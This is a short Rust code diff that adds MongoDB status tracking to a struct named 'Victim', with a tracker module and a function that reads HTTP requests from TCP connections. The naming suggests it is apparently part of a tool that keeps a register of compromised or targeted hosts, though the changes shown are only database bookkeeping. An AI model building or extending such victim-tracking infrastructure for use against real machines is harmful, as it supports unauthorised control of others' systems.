@@ -2,6 +2,8 @@ use std::{fmt::Display, net::SocketAddr};
 
 use serde::{Serialize, Deserialize};
 use tokio::{io::{BufReader, AsyncBufReadExt, AsyncWriteExt}, net::TcpStream};
+use mongodb::Collection;
+use mongodb::bson::doc;
 
 use crate::tracker::is_victim_listening;
 
@@ -27,13 +29,24 @@ pub struct Victim {
     pub victim_type: VictimType
 }
 
+impl Victim {
+    pub async fn update_status(&self, victims_collection: &Collection<VictimDb>, status: bool) -> Result<(), Box<dyn std::error::Error>> {
+        let filter = doc! { "ip": self.ip.to_string() };
+        let update = doc! { "active": status };
+        victims_collection.update_one(filter, update, None).await?;
+
+        Ok(())
+    }
+}
+
 #[derive(Debug, Deserialize, Serialize)]
 pub struct VictimDb {
     pub ip: String,
-    pub victim_type: VictimType
+    pub victim_type: VictimType,
+    pub active: bool
 }
 
-pub async fn check_connection(mut stream: TcpStream, current_ip: &SocketAddr) -> Option<Victim> {
+pub async fn check_connection(mut stream: &mut TcpStream, current_ip: &SocketAddr) -> Option<Victim> {
     let mut buf_reader = BufReader::new(&mut stream);
     let mut http_request: Vec<u8> = Vec::new();
     buf_reader
